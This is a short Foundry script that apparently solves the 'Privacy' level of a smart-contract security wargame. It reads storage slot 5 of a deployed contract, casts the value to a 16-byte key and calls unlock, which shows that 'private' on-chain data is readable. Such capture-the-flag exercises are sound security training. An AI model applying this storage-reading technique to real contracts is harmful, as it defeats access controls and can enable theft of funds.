// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/Privacy.sol";
import "forge-std/console.sol";

contract CounterScript is Script {
    Privacy level12 = Privacy(0x2293aB373d262210e5EB333B5b99F77644b238F0);

    function run() external {
        vm.startBroadcast();
        bytes32 myKey = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));
        vm.stopBroadcast();
    }
}
